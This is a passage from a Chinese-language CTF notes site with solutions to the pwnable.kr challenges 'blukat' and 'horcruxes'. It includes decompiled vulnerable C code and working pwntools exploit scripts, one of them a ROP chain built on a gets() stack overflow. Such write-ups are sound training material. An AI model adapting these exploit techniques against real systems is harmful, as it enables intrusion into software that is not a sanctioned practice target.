<pre><code class="lang-bash">blukat@prowl:~$ cat password
cat: password: Permission denied <span class="hljs-comment">#&#x4E00;&#x822C;&#x662F;&#x6743;&#x9650;&#x4E0D;&#x8DB3;&#x7684;&#x6B63;&#x5E38;&#x56DE;&#x663E;&#x3002;&#x3002;&#x3002;&#x3002;</span>
</code></pre>
<p>&#x540E;&#x6765;&#x53D1;&#x73B0;password&#x662F;&#x53EF;&#x4EE5;scp&#x4E0B;&#x4E0B;&#x6765;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;password&#x91CC;&#x9762;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p>&#x8F93;&#x5165;&#x5373;&#x53EF;</p>
<p><strong>Exp</strong></p>
<pre><code>#coding=utf-8
from pwn import *
context(arch=&quot;amd64&quot;,os=&quot;Linux&quot;,log_level=&quot;DEBUG&quot;)

shell = ssh(host=&quot;pwnable.kr&quot;,user=&quot;blukat&quot;,port=2222,password=&quot;guest&quot;)

shell.download_file(&quot;./password&quot;)

io=shell.run(&quot;./blukat&quot;)

io.sendlineafter(&quot;guess the password!&quot;,&quot;cat: password: Permission denied&quot;)
io.interactive()
</code></pre><h2 id="0x15-horcruxes"><a name="0x15-horcruxes" class="anchor-navigation-ex-anchor" href="#0x15-horcruxes"><i class="fa fa-link" aria-hidden="true"></i></a>0x15 horcruxes</h2>
<p>&#x9006;&#x5411;&#x540E;&#x6838;&#x5FC3;&#x6E90;&#x7801;</p>
<pre><code class="lang-cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">ropme</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+4h] [ebp-74h]</span>
  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [esp+68h] [ebp-10h]</span>
  <span class="hljs-keyword">int</span> fd; <span class="hljs-comment">// [esp+6Ch] [ebp-Ch]</span>

  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Select Menu:&quot;</span>);
  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);
  getchar();
  <span class="hljs-keyword">if</span> ( v2 == a ) A();
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v2 == b ) B();
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v2 == c ) C();
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v2 == d ) D();
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v2 == e ) E();
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v2 == f ) F();
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v2 == g ) G();
  <span class="hljs-keyword">else</span>
  {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;How many EXP did you earned? : &quot;</span>);
    gets(s);<span class="hljs-comment">//&#x5B58;&#x5728;&#x6808;&#x6EA2;&#x51FA;</span>
    <span class="hljs-keyword">if</span> ( atoi(s) == sum )
    {
      fd = open(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-number">0</span>);
      s[read(fd, s, <span class="hljs-number">0x64</span>u)] = <span class="hljs-number">0</span>;
      <span class="hljs-built_in">puts</span>(s);
      close(fd);
      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
    }
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You&apos;d better get more experience to kill Voldemort&quot;</span>);
  }
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x9898;&#x76EE;&#x601D;&#x8DEF;&#x662F;&#x62FF;&#x5230;a,b,c,d,e,f,g&#x7684;&#x503C;&#xFF0C;&#x6765;&#x5F97;&#x5230;flag</p>
<p>a,b,c,d,e,f,g&#x968F;&#x673A;</p>
<p>&#x76F4;&#x63A5;&#x7ED5;&#x8FC7;&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x884C;&#x7684;&#xFF0C;main&#x91CC;&#x7684;seccomp&#x628A;&#x53EF;&#x7ED5;&#x8FC7;&#x7684;&#x5730;&#x5740;&#x90FD;&#x5C01;&#x6B7B;&#x4E86;</p>
<p>&#x8FD8;&#x662F;&#x5229;&#x7528;gets&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x53BB;&#x8C03;&#x7528;A,B,C,D,E,F,G&#x7684;&#x51FD;&#x6570;&#x6765;&#x5F97;&#x5230;&#x5BF9;&#x5E94;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8DF3;&#x56DE;&#x6765;&#x8F93;&#x5165;&#x5BF9;&#x5E94;&#x7684;EXP</p>
<p><strong>Exp</strong></p>
<pre><code class="lang-python"><span class="hljs-comment">#coding=utf-8</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;Linux&quot;</span>,log_level=<span class="hljs-string">&quot;DEBUG&quot;</span>)

shell = ssh(host=<span class="hljs-string">&quot;pwnable.kr&quot;</span>,user=<span class="hljs-string">&quot;horcruxes&quot;</span>,port=<span class="hljs-number">2222</span>,password=<span class="hljs-string">&quot;guest&quot;</span>)

<span class="hljs-comment">#shell.download_file(&quot;./horcruxes&quot;)</span>

io=shell.connect_remote(<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-number">9032</span>)

payload=<span class="hljs-string">&quot;1&quot;</span>
<span class="hljs-comment">#io.sendlineafter(&quot;guess the password!&quot;,&quot;cat: password: Permission denied&quot;)</span>
io.recv()
io.sendline(payload)

a_addr=<span class="hljs-number">0x0809FE4B</span>
b_addr=<span class="hljs-number">0x0809FE6A</span>
c_addr=<span class="hljs-number">0x0809FE89</span>
d_addr=<span class="hljs-number">0x0809FEA8</span>
e_addr=<span class="hljs-number">0x0809FEC7</span>
f_addr=<span class="hljs-number">0x0809FEE6</span>
g_addr=<span class="hljs-number">0x0809FF05</span>
call_ropme_addr=<span class="hljs-number">0x0809FFFC</span>

payload=<span class="hljs-string">&apos;a&apos;</span>*(<span class="hljs-number">0x74</span>+<span class="hljs-number">0x4</span>)+p32(a_addr)+p32(b_addr)+p32(c_addr)+p32(d_addr)+p32(e_addr)+p32(f_addr)+p32(g_addr)+p32(call_ropme_addr)
<span class="hljs-comment">#&#x5F53;&#x51FD;&#x6570;A()&#x6267;&#x884C;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C;return&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;&#x5E94;&#x5C31;&#x662F;&#x540E;4&#x4E2A;bytes&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x5C06;&#x5730;&#x5740;&#x7F57;&#x5217;&#x5728;padding&#x6570;&#x636E;&#x4E4B;&#x540E;&#xFF0C;&#x51FD;&#x6570;&#x4F1A;&#x4E00;&#x4E2A;&#x4E00;&#x4E2A;&#x7684;&#x8FDB;&#x884C;&#x8DF3;&#x8F6C;</span>

io.sendlineafter(<span class="hljs-string">&quot;How many EXP did you earned? :&quot;</span>,payload)
exp=<span class="hljs-number">0</span>
io.recvline()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):
    re = io.recvline()
    u = int(re.strip(<span class="hljs-string">&apos;\n&apos;</span>).split(<span class="hljs-string">&apos;+&apos;</span>)[<span class="hljs-number">1</span>][:<span class="hljs-number">-1</span>])
    <span class="hljs-keyword">print</span> u
    exp += u
<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Exp: &quot;</span>+str(exp)
io.sendlineafter(<span class="hljs-string">&quot;Select Menu:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)
io.sendlineafter(<span class="hljs-string">&quot;How many EXP did you earned? :&quot;</span>,str(exp))
io.interactive()
</code></pre>
<p>&#x4E00;&#x4E2A;&#x5751;&#x70B9;&#x662F;&#xFF1A;</p>
<p>ropme&#x7684;&#x5730;&#x5740;&#x662F;0x080A0009 &#x6709;&#x4E2A;0xA0 &#x76F8;&#x5F53;&#x4E8E;&#x6362;&#x884C;&#x7B26; &#x6240;&#x4EE5;&#x4F1A;&#x88AB;gets&#x622A;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x7ED5;&#x4E00;&#x6B65;&#x7528;main&#x91CC;call ropme&#x7684;&#x5730;&#x5740;&#x505A;&#x66FF;&#x6362;</p>
<p>&#x53E6;&#x4E00;&#x4E2A;&#x5751;&#x70B9;&#x662F;&#xFF1A;</p>
<p>atoi&#x51FD;&#x6570;&#x5C06;int&#x8F6C;&#x5316;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x5B57;&#x8D85;&#x8FC7;int&#x8303;&#x56F4;&#x8F6C;&#x5316;&#x5931;&#x8D25;&#x8FD4;&#x56DE;-1&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x591A;&#x8BD5;&#x51E0;&#x904D;&#x624D;&#x80FD;&#x51FA;flag..... </p>
<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
2021-05-07 16:30:35
</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="./" class="navigation navigation-prev " aria-label="Previous page: pwnable.kr">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../ethernaut/" class="navigation navigation-next " aria-label="Next page: Ethernaut">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Toddler's Bottle","level":"1.6.1","depth":2,"next":{"title":"Ethernaut","level":"1.7","depth":1,"path":"ethernaut/README.md","ref":"ethernaut/README.md","articles":[]},"previous":{"title":"pwnable.kr","level":"1.6","depth":1,"path":"pwnable.kr/README.md","ref":"pwnable.kr/README.md","articles":[{"title":"Toddler's Bottle","level":"1.6.1","depth":2,"path":"pwnable.kr/toddlers-bottle.md","ref":"pwnable.kr/toddlers-bottle.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"pwnable.kr/toddlers-bottle.md","mtime":"2021-05-07T08:30:35.941Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
        
    

    </body>
</html>

